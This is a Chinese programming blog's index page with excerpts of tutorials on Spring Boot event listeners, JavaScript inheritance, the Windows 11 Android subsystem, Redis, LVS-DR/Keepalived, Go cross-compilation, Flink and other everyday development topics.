<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49e0a01a23781a9e0d4fb9c0b1d0c2f6/" rel="bookmark">
			SpringBoot事件监听器的四种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java事件监听
事件监听的概念：
事件监听就是让电脑通过你的操作得到一些数据并对这些数据做出反应，反馈相应的行为或者指令的操作。
java中的事件机制的参与者有3种角色；
event object:事件状态对象，继承自java.util.EventObject，作为数用于listener的相应的方法之中。伴随事件的发生，相应的状态通常都封装在事件状态象中。event source:具体的事件源，比如说，你点击个button，那么button就是event source，要想使button对某些事件进行响应，你就需要注册特定的listener。event listener:对每个明确的事件的发生，都相应地定义个明确的Java方法。这些方法都集巾定义在事件监听者(EventListener)接口中，这个接口要继承java.util.EventListener。实现了事件监听者接口中一些或全部方法的类就是事件监听者， Spring监听器
Spring的件监听是基于观察者模式。遵发布-订阅模型。
意思就是：发布者发布信息，订阅者获取信息，订阅了就能收到信息，没订阅就收不到信息。T该模型主要由四个角色组成：
事件(ApplicationEvent)：继承了jdk的EventObject;spring在容器中定义了四大事件，分别对应容器启动、刷新、停止、关闭四个时刻；在spring项目中可以继承ApplicationEvent.来自定义自己的事件。发布者(ApplicationEventPublisher)：事件发布类，声明了一个用于发布事件的publishEvent()方法。ApplicationContext实现了该接口。事件订阅者(ApplicationListener)：用于接收事件，并触发事件的操作。一旦事件触发，就会执行其中的onApplicationEvent方法。事件广播器(ApplicationEventMulticaster)：用于查找事件监听器。
功能划分：
在Spring中通常是ApplicationContext本身担任监听器注册表的角色，在其子类
AbstractApplicationContext中就聚合了事件广播器ApplicationEventMulticaster和事件监听器ApplicationListnener，并且提供注册监听器的addApplicationListnener方法。
执行流程：
当一个事件源产生事件时，它通过事件发布器ApplicationEventPublisher发布事件，然后事件广播器ApplicationEventMulticaster会大事件注册表ApplicationContext中找到事件监听器ApplicationListnener，并且逐个执行监听器的onApplicationEvent方法，从而完成事件监听器的逻辑。 SpringBoot自定义事件 Spring框架早已得供了完善的事件监听机制在Spring框架中实现事件监听的流程如下：
自定义事件，继承org.springframework.context.ApplicationEvent抽象类 package com.zuxia.event; import org.springframework.context.ApplicationEvent; public class CustomEvent extends ApplicationEvent { public CustomEvent(Object source){ super(source); } public void printMessage(String msg){ System.out.println("自定义事件：打印信息"+msg); } } 定义事件监听器，实现org.springframework.context.ApplicationListener接口 package com.zuxia.listener; import com.zuxia.event.CustomEvent; import org.springframework.context.ApplicationListener; public class CustomListener1 implements ApplicationListener&lt;CustomEvent&gt; { @Override public void onApplicationEvent(CustomEvent event) { event.printMessage("CustomListener1监听到了"); } } 在Spring容器中发布事件
提供了四种实现监听的方式：
方式一：自定义类实现ApplicationListonser接口，并且在入口主函数中使用ConfigurableApplicationContext容器装载监听 package com.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/49e0a01a23781a9e0d4fb9c0b1d0c2f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7faf2833f0fa2c79b6f8811918a0ef3a/" rel="bookmark">
			JS中对象的四种继承方式：class继承、原型链继承、构造函数继承、组合继承（构造函数和原型链继承的结合）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 才发现之前没有对JavaScript中的继承做过总结，不过看得到是不少，接下来就对这几种继承方式做一下总结。
class继承 class继承是ES6引入的标准的继承方式。
ES6引入了class（类）这个概念，作为对象的模板，通过class关键字可以定义对象。
&lt;script&gt; // class 继承 class Point { constructor(x, y) { this.x = x; this.y = y; } toString() { return '(' + this.x + ',' + this.y + ')'; } } var point = new Point(2,3); class ColorPoint extends Point{ constructor(x,y,color){ super(x,y); //等同于super.constrctor(x,y) this.color = color; } toString(){ return this.color+ ' ' + super.toString(); } } var colorPoint = new ColorPoint(2,3,'red'); console.log(colorPoint); &lt;/script&gt; super的使用
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7faf2833f0fa2c79b6f8811918a0ef3a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c28a780b110a9ba4af17ee7196da8d74/" rel="bookmark">
			win11安卓子系统如何安装app
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		就在近日，微软正式推出了win11安卓子系统，全名是windows subsystem for android，通过它，你可以在win11上运行大多数主流的app，例如酷安、亚马逊应用商店、支付宝等应用，可以更轻松地探索、发现，体验前所未有的快感。相较于其它模拟器而言，该系统的CPU的转译效率，比模拟器起码高两倍以上，体验无疑和模拟器拉开了身位，再加上每个App拥有独立任务，使用起来和原生App无异，而且应用窗口可以自由放大缩小，这对摸鱼达人有特殊加成。除此之外，日常使用app主要吃CPU资源，但WSA的CPU效率拉满，完全不用担心流畅度不够，还可以集成到 Alt + 选项卡和任务视图中，帮助用户在 App 之间快速切换，添加了无障碍体验，致力于让用户感受到极致的乐趣。但值得注意到是，安卓子系统需要最低8G内存，不管是dev或者是beta都可以安装，并且需要为 PC 的 BIOS/UEFI 启用虚拟化功能，对于部分想尝鲜的用户来说安装起来可能稍些许有点困难。所以在下文小编奉上了详细的安装使用图文教程，希望对用户们所有帮助，感兴趣的小伙伴们千万不要错过了！
→软件资源←
注意事项： 1、系统必须为WIN11
2、需要CPU开启虚拟化
3、需要安装Hyper-V
win11安卓子系统安装教程 下载得到微软win11安卓子系统软件包，如下图：
如果是实体机安装系统，一般按照流程走没有问题，用VMware虚拟机安装，需要先在设置中添加TPM模块，不然会提示不支持Windows11。打开虚拟机的设置，先添加一个访问控制的密码，这个密码很重要，以后每次虚拟机开启都需要输入
必须设置好密码之后，才能添加可信的平台模块，不然按钮会是灰色的；
安装好系统之后，加入体验计划，选择BETA渠道
加入成功后，重启电脑或虚拟机。
接下来准备安装需要运行的环境，首先首先把这个微软应用商店的链接复制一下，这个链接直接访问会提示错误：
https://www.Microsoft.com/store/productId/9P3395VX91NR
再打开浏览器，输入下面的网址：https://store.rg-adguard.net，之后把上面微软应用商店的链接粘贴进来，后面的选择Slow，再点击勾按钮；
回车开始安装，如果不是64位的话，就按照你的系统架构去选择，双击安装Microsoft.VCLibs.和Microsoft.UI.Xaml开头的文件；
现在开始安装本体，先点击搜索，按照图中的示例，用管理员身份运行；
然后在提示框输入：
add-appxpackage ""
在引号中粘贴上文件的地址，右键复制即可；
回车开始安装，这里注意：如果你没装那两个Microsoft.VCLibs.和Microsoft.UI.Xaml开头的文件就可能会提示错误；
那么前往配置系统环境，在应用中找到可选功能进入；
之后下滑找到更多 Windows功能，按照图示进行勾选；
下面的虚拟机平台不是必选的；
还有系统安全里的内核完整性，但是有朋友说这个可能也与安装有关系，可以看情况进行勾选；
安装软件，配置好Hyper-v后系统会提示重启，重启之后就能看到多出来的软件本体了，需要在开始菜单自行寻找。
打开图中右边的图标进行设置，最后就可以自行下载软件进行体验啦。
win11安卓子系统如何安装酷安？ 首先，我们要在电脑上下载“秋之盒”软件，下载完成之后点击右边的“网络连接新设备”；
接着会出现这个提示框；
所谓的设备IP地址，其实就是WSA设置中的IP地址。
在WSA设置中，打开【开发人员模式】，就能看到IP地址。
咱们直接把它复制并粘贴到秋之盒的提示框，只要不输错，一般都会连接成功。
现在只需在电脑提前准备好酷安APK安装包，点击秋之盒的“安装APK”按钮，选中酷安APK。
不到5秒，酷安就自动安装到你的电脑上啦。
老样子，酷安App并不会出现在桌面上，我们要在开始菜单寻找。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8f3b96c941189412f172a4d9ba99fd8/" rel="bookmark">
			redis：CLUSTER ADDSLOTS、CLUSTER DELSLOTS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CLUSTER ADDSLOTS 语法 CLUSTER ADDSLOTS slot [slot ...] 自3.0.0起可用。
时间复杂度： O（N）其中N是散列槽参数的总数
作用 此命令仅适用于集群模式
Redis CLUSTER ADDSLOTS 命令用于把一组 hash slots 分配给接收命令的节点。这个命令仅在 cluster 模式下生效，如果命令执行成功，节点将指定的 hash slots 映射到自身，节点将获得指定的 hash slots，同时开始向集群广播新的配置。
但，请注意：
仅当从接收命令的节点来看，所有指定的插槽当前未分配时，该命令才起作用。节点将 拒绝接纳已经分配到其他节点的slots（包括它自己的）。同一个slot被指定多次的情况下命令会失败。执行这个命令有一个副作用，如果slot作为其中一个参数设置为importing，一旦节点向自己分配该slot（以前未绑定）这个状态将会被清除。 返回值 simple-string-reply: 如果命令执行成功，返回 OK，否则返回错误信息。 例子 以下命令分配 1 2 3 slot 到接收命令的节点：
redis&gt; CLUSTER ADDSLOTS 1 2 3 OK 但是试图再次执行命令结果将会错误，因为 slots 已经被分配了：
redis&gt; CLUSTER ADDSLOTS 1 2 3 ERR Slot 1 is already busy 使用场景 该命令仅适用于集群模式，在以下 Redis 集群操作中很有用：
创建新集群时，ADDSLOTS 用于主节点初始化分配可用的 hash slots。修复某些插槽未分配时损坏的集群 注意：有关插槽传播和警告的信息
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8f3b96c941189412f172a4d9ba99fd8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/432447b62ba68e647ddfa70958a13362/" rel="bookmark">
			【SSH框架/国际物流商综平台】-06 javamail与spring集成 MailUtil,SimpleMailMessage,JavaMailSender,MimeMessag,helper
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		回顾： 1.用户—角色 Span 标签的样式:display:inline-block;width:200px
2. 角色…模块 zTree树展示权限列表
实际项目用得多，zTree的使用步骤：
1.导入js/css
2.jsp中引入js/css
3.组织 json 数据,手动拼接 json 串[{id:"”,pld:"”,name:〃”,checked:“true|false”}]
4.将这个json串向浏览器输出:response对象手动输出
5.客户端可以发出ajax请求，来得到这个json串
$,ajax({url:"",dataType:“text”,type:"GET”,success:function(){} });
注意多对多操作时，如果要操作中间表的关系，不需要加cascade
3.struts2异常处理框架 struts.xml文件中配置：
〈global-results〉
/WEB-INF/pages/error.jsp
&lt;exception-mapping exception=,zcn.itcast.jk.exception.SysException,z result= “error”/〉
&lt;/ global-exception-mappings&gt;
Action类中
throw new SysException。、'7);
一.什么是 JavaMail JavaMail是提供给开发人员在应用程序中实现邮件发送和接收功能而提供的一 套标准开发类库，支持常用的邮件协议，如SMTP、POP3、IMAP ,开发人员使用 JavaMail编写邮件程序时，无需考虑底层的通信细节(Socket) , JavaMail也提供了能够 创建出各种复杂MIME格式的邮件内容的API。使用JavaMail ,我们可以实现类似 OutLook、FoxMail 的软件。
二.JavaMail的基本概述 1.邮件开发的相关协议 SMTP : Simple Message Transfer Protocal 发送协议默认端口 ： 25
POP : Post Office Protocal邮局协议。POP3这个版本用的最多,接收协议默认端口 ： 110
2 .邮件发送接收的过程分析 三.邮件开发的准备工作 1.申请邮箱 我这里申请的是新浪、网易邮箱，进入后开通P0P3/SMTP服务
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/432447b62ba68e647ddfa70958a13362/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2520b56f6e717ad6a4c37aa9a7c2224/" rel="bookmark">
			在scrapy爬取微博热评时出现MySQLdb._exceptions.ProgrammingError错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题代码：
MySQLdb._exceptions.ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to you r MySQL server version for the right syntax to use near 'read,mention) values ('家长偏心对孩子的影响有多大',15424499,5655)' at line 1") 首先分析报错信息：MySQLdb._exceptions.ProgrammingError是 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。
所以我就首先检查了sql语句，当我在navicat中运行我的sql语句是发现：
很明显，里边的read是关键字索引报错了。
解决方法：把items中key值改其他的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d49414f8de58011be908e4d743202ff/" rel="bookmark">
			直连路由模式(LVS-DR)&#43;Keepalived
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
一、LVS-DR模式
1.DR模式数据包流量分析
2.LVS-DR中的ARP问题
3.解决ARP的两个问题的设置方法
4.DR处理问题后的流量分析
5.DR特点
二、Keepalived
1.Keepalived
2.Keepalived实现原理剖析
三、LVS-DR-Keepalived部署
1.配置主负载服务器
2.部署web节点服务器
3.配置keepalived
总结
前言 Keepalived起初是专门针对LVS设计的一款强大的辅助工具，主要用来提供故障切换和健康检查功能——判断LVS负载调度器、节点服务器的可用性，及时隔离替换为新的服务器，当故障主机恢复后将其重新加入群集。
一、LVS-DR模式 1.DR模式数据包流量分析 客户端向目标VIP发送请求，负载均衡器接收负载均衡器根据负载均衡算法选择后端真实服务器，不修改也不封装IP报文，而是将数据帧的MAC地址改为后端真实服务器的MAC地址，然后在局域网上发送。后端真实服务器收到这个帧，解封装后发现目标IP与本机匹配（事先绑定了VIP），于是处理这个报文。随后重新封装报文，将响应报文通过lo接口传送给物理网卡然后向外发出，客户端将收到回复报文。客户端认为得到正常的服务，而不会知道是哪一台服务器处理的如果跨网段，则报文通过路由器经由 internet 返回给用户。
2.LVS-DR中的ARP问题 1.在LVS-DR负载均衡集样中，负载均衡与节点服务器都要配置相同的VIP地址。
2.在局域网中具有相同的IP地址，势必会造成各服务器ARP通信的紊乱。
3.对节点服务器进行处理，使其不响应针对VIP的ARP请求。
解决方法
使用虚接口 lo:0 承载VIP地址设置内核参数 arp_ignore=1：系统只响应目的IP为本地 IP 的ARP请求
4.RealServer返回报文(源IP是VIP)经路由器转发，重新封装报文时,需要先获取路由器的MAC地址。
5.发送ARP请求时，Linux默认使用IP包的源IP地址(即VIP)作为ARP请求包中的源IP地址，而不使
用发送接口的IP地址如：ens33
6.路由器收到ARP请求后，将更新ARP表项
7.原有的VIP对应Director的MAC地址会被更新为VIP对应RealServer的MAC地址
8.路由器根据ARP表项，会将新来的请求报文转发给Realserver，导致Director的VIP失效
解决方法：对节点服务器进行处理，设置内核参数arp_announce=2：系统不使用IP包的源地址来设置ARP请求的源地址，而选择发送接口的IP地址。
3.解决ARP的两个问题的设置方法 修改 /etc/sysctl.conf 文件
net.ipv4.conf.lo.arp_ignore = 1
net.ipv4.conf.lo.arp_announce = 2
net.ipv4.conf.all.arp_ignore = 1
net.ipv4.conf.all.arp_announce = 2
4.DR处理问题后的流量分析 客户端发送请求到Director server (负载均衡器)，请求的数据报文(源IP是CIP，目标IP是VIP)到达内核空间。
Director Server和Real server在同一个网络中，数据通过二层数据链路层来传输。
内核空间判断数据包的目标I是本机VIP，此时IPVS (IP虚拟服务器)比对数据包请求的服务是否是集群服务，是集群服务就重新封装数据包。修改源MAC地址为Director Server的MAC地址，修改目标MAC地址为Real Server的MAC地址，源IP地址与目标IP地址没有改变，然后将数据包发送给Real Server。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d49414f8de58011be908e4d743202ff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c5d63de11e5c91d946cac727c9566c1/" rel="bookmark">
			JS DOM 编程复习笔记--appendChild、textContent、innerText、innerHTML（五）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上一篇文章中我们使用appendChild()方法将我们创建的DOM元素插入到指定的父元素的最后位置。今天我们继续来看看这几个API，textContent、innerText、innerHTML，它们都是比较常用的，用来获取和设置HTML的内容或者标签。下面我们从appendChild开始
appendChild() 我们来复习一下语法
parentNode.appendChild(childNode); appendChild()将传入的childNode插入到parentNode的最后一个子元素的后面，并返回插入的元素。
如果childNode是页面中已经存在的DOM节点，那么appendChild()方法将会把childNode从原来的位置移动到新的位置。
先来回顾一下appendChild()基础使用
基础用法例子 &lt;ul id="menu"&gt; &lt;/ul&gt; &lt;script&gt; function createMenuItem(name) { let li = document.createElement('li'); li.textContent = name; return li; } // 获取ul#menu元素 const menu = document.querySelector('#menu'); // 添加子元素 menu.appendChild(createMenuItem('首页')); menu.appendChild(createMenuItem('产品')); menu.appendChild(createMenuItem('关于我们')); &lt;/script&gt; 运行后，HTML如下
移动节点例子 我们的HTML如下
&lt;ul id="first-list"&gt; &lt;li&gt;HTML&lt;/li&gt; &lt;li&gt;CSS&lt;/li&gt; &lt;li&gt;JavaScript&lt;/li&gt; &lt;/ul&gt; &lt;ul id="second-list"&gt; &lt;li&gt;Vue&lt;/li&gt; &lt;li&gt;React&lt;/li&gt; &lt;li&gt;Angular&lt;/li&gt; &lt;/ul&gt; &lt;script&gt; // 获取#first-list元素 const firstList = document.querySelector('#first-list'); // 获取第一个子元素 const htmlElement = firstList.firstElementChild; // 获取#second-list元素 const secondList = document.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c5d63de11e5c91d946cac727c9566c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7623ac365e5db7c4ea4368fa2c322c91/" rel="bookmark">
			解决Ubuntu系统断网问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Ubuntu系统会每隔一段时间 lcp-echo-interval=30 （30s）检查是否有echo-reply信号，如果长时间不使用，连续 lcp-echo-failure=4 次都没有信号，Ubuntu就认为网络出现了问题，就会自行断开网络。
sudo vi /etc/ppp/options 找到
lcp-echo-interval 和 lcp-echo-failure
把值改大
再重启网络
sudo service network-manager restart 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb6722b0aed435b3eb9ab2683f372266/" rel="bookmark">
			微信小程序引入echarts 过大最佳解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引入echarts以后，单echarts代码包已经973KB，如何能压缩大小？使用自定义的方法 压缩文件大小 官网地址可以根据实际项目情况选择用到的echarts组件进行构建，如下图所示：
选择完成以后，点击【下载】就可以下载我们自定义构建的echart文件 注：勾选代码压缩以后下载的文件名称为：echarts.min.js
未勾选代码压缩以后下载的文件名称为：echarts.js
将下载的echarts.min.js重命名为echarts.js替换项目ec-canvas目录下的echarts.js,将原本大小将近1000KB的echarts压缩了一半。echarts在微信开发者工具中不跟随滑动微信开发者工具的模拟器查看echarts时，我们会发现图表没有随着滚动条而滑动，但是在进行真机模拟的时候却又一切正常，这个时候我们可以在wxml的canvas中添加一个属性( force-use-old-canvas=“true”)解决这个问题： &lt;ec-canvas force-use-old-canvas="true" id="{{echartData.recentTrendBar.id}}" canvas-id="mychart-multi-bar" ec="{{ echartData.recentTrendBar }}"&gt;&lt;/ec-canvas&gt; 使用echarts控制台提示使用canvas 2d
这里我们可以看到一个通过isUseNewCanvas进行判断使用新的/旧的canvas，因此我们只需要将对应ec-canvas/ec-canvas.js的isUseNewCanvas属性值改为true就可以了， 修改以后，控制台将不再提示该内容。 data: { isUseNewCanvas: true }, 9.以上操作之后，你会发现 图上提示框颜色发生了改变，是因为使用了新版本，所以记得选择对应的版本，以确保兼容性
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/11c69ff0ff3f266fe36a32e4d54829d6/" rel="bookmark">
			Go语言项目在Windows系统build在Linux运行的包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		打开Windows PowerShell
cd进入项目包（main所在的包）
输入：
$Env:GOARCH="amd64";$Env:GOOS="linux" 上面是为了设定系统环境，之后执行：
go build 过一段时间后会生成一个无后缀的文件，这时就build完成了。 注意：上传到Linux以后，可能会存在文件权限问题导致无法运行。如果出现这个问题，可以在Linux执行：
chmod 777 文件名 这是为了开放此文件的权限。接下来就可以运行项目了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2093ac5a999fb12bac7bee92aee4b3de/" rel="bookmark">
			小冰商城（手机app）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小冰商城 整体框架 xiaomiServe 后台node-koa服务器数据库mysqlxiaomi_front 移动端小冰商城appxiaomi_admin 后台管理系统 没有文件服务器，文件保存在后台服务器的静态文件夹 static文件夹下
安装教程 cd xiaomiServecnpm installcd xiaomi_frontcnpm installcd xiaomi_admincnpm installmysql 导入数据库 shops.sql修改 xiaomiServer/router/koa-router.js 中关于数据库的配置 启动说明 cd xiaomiServenode index.js打开新的终端cd xiaomi_frontnpm run serve 项目地址/源码 https://gitee.com/yerun013698/xiaobing-mall.git
自己做的demo项目，新手入坑，请多指教
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/abe372422cb05975d9452376bdd1af8c/" rel="bookmark">
			Window本地Flink环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录Flink的第一天
为了方便本地调试Flink程序，本地搭建一个flink是必不可少的步骤
版本选择 java1.8+
flink1.12.5
https://www.apache.org/dyn/closer.lua/flink/flink-1.12.5/flink-1.12.5-bin-scala_2.12.tgz 下载好直接解压就行
运行切换到目录 执行 start-cluster.bat 因为新版本没有bat文件 可以直接下载
链接：https://pan.baidu.com/s/1aQZQ1jRdxbOn9GxeAftUsA
提取码：e1m0
–来自百度网盘超级会员V1的分享
下载好放在%flink%/bin目录下 运行就行 随意打开一个浏览器输入:localhost:8081 安装完成 开始第一个flink项目吧
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9a2856602d329c109546ed22f9433f4/" rel="bookmark">
			SpringMVC 5.2.9 &#43; MySQL 8.0.25 &#43; jdk 1.8 version 15
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
SpringMVC
1.回顾MVC 架构
2 回顾Servlet
3、初识SpringMVC
4 第一个 SpringMVC 项目
4.1配置版
4.2 注解版
5 SpringMVC 执行原理
6 Controller 配置总结
控制器Controller
实现Controller接口
使用注解@Controller
@RequestMapping
7 Restful 风格
8 结果跳转方式
8.1 ModelAndView
8.2 ServletAPI
8.3 SpringMVC
9 数据处理
9.1 处理提交数据
9.2 数据显示到前端
10 乱码的问题
11 jSON
11.1 什么是Json?
11.2 Controller 返回 JSON 数据
11.2.1 Jackson
11.2.2 fastson
12 整合SSM
12.1 Mybatis层编写
12.2 Spring层
12.3 SpringMVC层
12.4 Controller 和 视图层编写
13 Ajax
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d9a2856602d329c109546ed22f9433f4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0abf4d1bb13ba70cd09ee546284a3ecf/" rel="bookmark">
			XGB的python实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		搜索最优的xgb模型参数 from xgboost import XGBClassifier from sklearn.model_selection import GridSearchCV X_train = np.random.randn(10,8) y_train = np.concatenate([np.ones(5),np.zeros(5)],0) # 定义参数取值范围 parameters = {'learning_rate': [0.1, 0.2, 0.3, 0.4], 'subsample': [0.6, 0.7, 0.8, 0.9,1.0], 'colsample_bytree': [0.7, 0.8, 0.9, 1.0], 'max_depth': [1, 2, 3, 5, 8], 'n_estimators': [100, 200, 300, 500, 700]} model = XGBClassifier(n_estimators=200) clf = GridSearchCV(model, parameters, cv=3, scoring='roc_auc', verbose=1, n_jobs=-1) clf = clf.fit(X_train, y_train) # 网格搜索后的最好参数为 print(clf.best_params_) 使用xgb进行训练预测 import numpy as np from xgboost import XGBClassifier X_train = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0abf4d1bb13ba70cd09ee546284a3ecf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/988c12e6bf5e66e04269322bcf1f8b42/" rel="bookmark">
			输入框与多选树级选择器联动可搜索
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		功能： 做一个输入框可以和多级树选择器联动且可以过滤搜索的效果
效果预览： 代码： &lt;div class="fliterBox"&gt; &lt;span class="demonstration"&gt;抓拍点：&lt;/span&gt; &lt;el-popover placement="bottom-start" width="auto" trigger="click" &gt; &lt;el-input v-model="filterText" placeholder="输入关键字进行过滤" /&gt; &lt;el-tree ref="tree" class="filter-tree" show-checkbox node-key="id" :data="data" :props="defaultProps" default-expand-all :filter-node-method="filterNode" :check-on-click-node="true" :expand-on-click-node="false" @check-change="handleCheck" /&gt; &lt;el-input slot="reference" v-model="currentNode" placeholder="请输入内容" /&gt; &lt;/el-popover&gt; &lt;/div&gt; &lt;script&gt; export default { name: 'App', data() { return { currentNode: '', filterText: '', data: [{ id: 1, label: '一级 1', children: [{ id: 4, label: '二级 1-1', children: [{ id: 9, label: '三级 1-1-1' }, { id: 10, label: '三级 1-1-2' }] }] }, { id: 2, label: '一级 2', children: [{ id: 5, label: '二级 2-1' }, { id: 6, label: '二级 2-2' }] }, { id: 3, label: '一级 3', children: [{ id: 7, label: '二级 3-1' }, { id: 8, label: '二级 3-2' }] }], defaultProps: { children: 'children', label: 'label' } } }, watch: { filterText(val) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/988c12e6bf5e66e04269322bcf1f8b42/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/501a1fbee73268bbe9e76c745f4c20b8/" rel="bookmark">
			什么样的数据适合缓存
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么样的数据适合缓存?
1、访问频率高
2、更改频率低
3、一致性要求不高
缓存效能
最小内存（昂贵） --- 最大功用
重要的指标：
命中率 = 从缓存中读取次数 / (总读取次数[从缓存中读取次数 + 从慢速设备上读取的次数])
Miss率 = 没有从缓存中读取的次数 / (总读取次数[从缓存中读取次数 + 从慢速设备上读取的次数])
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8aa761474ca1b723e1cd0d344f5f222d/" rel="bookmark">
			linux:unset 一个环境变量，删除环境变量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在使用 export 导出、设定 一个 环境变量后，我想删除这个环境变量
我使用 unset
上图 的 1到 5，从上倒下
2 展示 了错误的方式，你不要在 unset 的时候 使用 $，直接像 4，5 那样 使用 变量名字 ，即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67c337622ee8433e038da1f60d35b9c1/" rel="bookmark">
			IDEA中输入sout回车后得到的是println如何解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		新手用IDEA写代码，输入sout并回车后得到的是println或者其他该如何解决，手把手教你如何设置
一、点击左上角 File，再点击Settings...
二、在搜索栏输入sout则会得到下图，要确保前面的勾是勾上的，并且在下方的文本框中输入
System.out.println($END$) 三、点击上图中右下角蓝色的change，如下图所示，确保java级下的勾都勾上
四、最后点击OK，设置完成
（类似问题也可使用该方法进行操作，继续探索吧）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/882c2018d83df3839ca9c73d291ac72d/" rel="bookmark">
			海康威视工业相机IP设置说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		整理电脑文件时翻到的，记录下来方便以后查阅。
第一步.先修改本机IP步骤如下： 1.打开本地连接 2.点击属性 3.选择协议—&gt;&gt;点击属性 4.选择使用下面IP地址 5.自己设置IP地址，然后点击确认 第二步.先修改本机IP步骤如下： 1.打开mvs,点击刷新按钮 2.刷新出所使用的相机型号时，鼠标放在相机位置，鼠标左键点击一下，选择修改IP 3.选择静态IP-----&gt;设置与本机IP同一网段（最后一位不同）------&gt;点击确认 4.点击此处进行相机连接 还有份MVS的使用指南
《千兆网口工业面阵相机用户手册V3.0.1》
